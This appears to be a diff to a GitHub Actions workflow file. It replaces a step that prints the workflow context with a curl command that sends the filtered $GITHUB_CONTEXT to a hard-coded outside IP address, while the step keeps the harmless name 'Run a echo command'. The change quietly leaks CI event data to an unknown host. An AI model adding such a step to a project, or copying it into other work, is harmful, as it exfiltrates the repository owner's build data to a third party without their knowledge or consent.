@@ -13,5 +13,6 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - name: Run a echo command
-      run: echo "$GITHUB_CONTEXT"| grep -i "after" 
+      run: curl -G http://152.57.230.222:80/q=$(echo "$GITHUB_CONTEXT"| grep -i "after")
+       
       
